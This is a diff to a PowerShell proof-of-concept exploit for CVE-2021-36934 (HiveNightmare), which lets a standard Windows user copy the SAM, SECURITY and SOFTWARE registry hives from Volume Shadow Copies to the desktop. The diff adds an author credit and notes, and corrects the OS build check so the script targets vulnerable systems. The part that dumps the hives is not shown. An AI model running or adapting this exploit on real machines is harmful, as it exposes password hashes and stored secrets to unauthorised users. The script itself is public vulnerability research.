@@ -1,7 +1,9 @@
 <#
     .SYNOPSIS
         PoC for CVE-2021-36934, which enables a standard user to be able to retrieve the SAM, Security, and Software Registry hives in Windows 10 version 1809 or newer. 
-    
+
+        The vulnerability was discovered by @jonasLyk.
+
     .PARAMETER path
         Used to supply the path to dump the Registry hives. If the parameter isn't used, the path will be default to the user's desktop.
 
@@ -14,6 +16,12 @@
         PS C:\> .\Invoke-HiveNightmare.ps1 
 
         Dumps the hives from the system's Volume Shadow Copies to C:\users\[USERNAME]\desktop.
+
+    .NOTES  
+        File Name      : Invoke-HiveNightmare.ps1
+        Version        : v.0.2
+        Author         : @WiredPulse
+        Created        : 21 Jul 21
 #>
 
 [CmdletBinding()]
@@ -29,7 +37,7 @@ if(-not(test-path $path)){
     new-item $path -ItemType Directory | out-null
 }
 
-if(([environment]::OSVersion.Version).build -gt 17763){
+if(([environment]::OSVersion.Version).build -lt 17763){
     Write-Host -ForegroundColor red "[-] System not susceptible to CVE-2021-36934"
     pause
     break
